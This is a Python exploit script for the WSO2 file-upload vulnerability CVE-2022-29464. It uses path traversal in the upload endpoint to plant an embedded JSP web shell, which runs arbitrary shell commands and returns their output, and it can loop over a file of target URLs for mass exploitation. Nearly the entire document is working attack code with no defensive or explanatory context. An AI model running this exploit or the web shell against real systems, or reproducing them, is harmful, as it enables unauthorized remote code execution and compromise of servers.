import os      
import urllib3 
import requests
import argparse
from ast import arg
from rich.console import Console
delete_warning = urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

console = Console()

shell= '''<%-- 
    https://github.com/jimidk 
    jim.maziashvili@gmail.com
--%>
<FORM>
    <INPUT name='cmd' style='width:70%;' type=text>
    <INPUT type=submit value='exec'>
</FORM>
<%@ page import="java.io.*" %>
    <%
    String cmd = request.getParameter("cmd");
    String output = "";
    String error = "";
    if(cmd != null) {
        String[] commandAndArgs = new String[]{ "/bin/sh", "-c", cmd };
        String s = null;
        Process process = Runtime.getRuntime().exec(commandAndArgs);
        InputStream inputStream = process.getInputStream();
        BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
        Thread.sleep(2000);
        while(process.isAlive()) Thread.sleep(100);
        while((s = reader.readLine()) != null) { output += s+"&#13;&#10;"; }
        reader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
        while((s = reader.readLine()) != null) { error += s+"&#13;&#10;"; }
    }
%>
cmd: <%=cmd %><br>
output:<br>
<textarea style="width:100%; height: 50%"><%=output %></textarea>
error:<br>
<textarea style="width:100%; height: 30%"><%=error %></textarea>'''

public_key = '''KEY'''

def exploit(url):
    try:
        resp = requests.post(f"{url}/fileupload/toolsAny", timeout=2, verify=False, files={"../../../../repository/deployment/server/webapps/authenticationendpoint/cmd": public_key})
        resp = requests.post(f"{url}/fileupload/toolsAny", timeout=2, verify=False, files={"../../../../repository/deployment/server/webapps/authenticationendpoint/cmd.jsp": shell})
        if resp.status_code == 200 and len(resp.content) > 0 and 'java' not in resp.text:
            console.log(f"[green][<>] Explorado com sucesso, shell : [bold]{url}/authenticationendpoint/cmd.jsp[/bold][/green]")

        else:
            console.log(f"\r[red][!] Falhou [/red] {url}")
    except (requests.exceptions.Timeout,requests.exceptions.ConnectionError,requests.exceptions.InvalidURL):
        console.log(f"[red][!] Falhou [/red]")



def main():
    parser = argparse.ArgumentParser(description="WSO2 CVE-2022-29464")
    parser.add_argument("-u", help="URL")
    parser.add_argument("-f", help="Arquivo")
    args = parser.parse_args()
    if args.f:
        links = []
        with open(f"{os.getcwd()}/{args.f}","r") as f:
            tmp = f.readlines()
            for link in tmp:
                link = link.replace('\n','')
                if not '://' in link:
                    link = f"https://{link}"
                links.append(link)
        with console.status("[bold green]Explorando...") as status:
            for link in links:
                exploit(link)
    else:
        url = args.u
        exploit(url)



if "__main__" == __name__:
    main()
